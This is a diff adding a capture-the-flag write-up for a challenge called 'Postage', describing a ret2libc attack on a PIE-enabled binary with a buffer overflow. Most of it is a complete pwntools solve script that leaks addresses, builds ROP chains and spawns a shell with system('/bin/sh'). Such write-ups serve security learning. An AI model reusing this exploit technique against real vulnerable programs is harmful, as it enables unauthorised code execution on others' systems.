@@ -1057,7 +1057,116 @@ Running it works!
 Flag: jctf{Center_Of_Attention}
 ```
 
+#### Postage
+
+This is just a standard ret2libc technique where pie is enabled and we have unbounded buffer overflow
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9fa5b08c-949b-4c2e-b91c-76eeed576da7)
+
+It implements radix sorting algorithm but that's not even important so we can just ignore it and go ahead with the exploitation
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/5d06edb3-a0c7-4579-aadd-93658554ec13)
+
+With that said it's then pretty trivial
+
+- Since vuln address is leaked we can calculate the elf base address
+- Leak the global offset table of puts
+- ROP to system
+
+Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/postage/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('./postage')
+libc = exe.libc
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+    offset = 56
+    
+    io.recvuntil('\nWelcome to  ')
+    leak = int(io.recvline(), 16)
+    exe.address = leak - exe.sym['vuln']
+
+    pop_rdi = exe.address + 0x0000000000001356 # pop rdi ; pop rbp ; ret
+
+    payload = flat({
+        offset: [
+            pop_rdi,
+            exe.got['puts'],
+            b'A'*8,
+            exe.plt['puts'],
+            exe.sym['main']+8
+        ]
+    })
+    
+    sleep(60)
+    io.sendline('pwner')
+    io.sendline(payload)
+
+    io.recvuntil('questions?\n')
+    leak = u64(io.recv(6).ljust(8, b'\x00'))
+    libc.address = leak - libc.sym['puts']
+
+    sh = next(libc.search(b'/bin/sh\x00'))
+    system = libc.sym['system']
+    ret = exe.address + 0x000000000000101a # ret
+
+    payload = flat({
+        offset: [
+            pop_rdi,
+            sh,
+            b'A'*8,
+            system
+        ]
+    })
+
+    io.sendline('pwner')
+    io.sendline(payload)
+
+    io.interactive()
 
 
+def main():
+    
+    init()
+    solve()
 
+if __name__ == '__main__':
+    main()
+```
+
+Running it works!
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/049fa43f-c064-426c-bc10-ab788106f49a)
+
+```
+Flag: jctf{Return_to_Sender}
+```
 
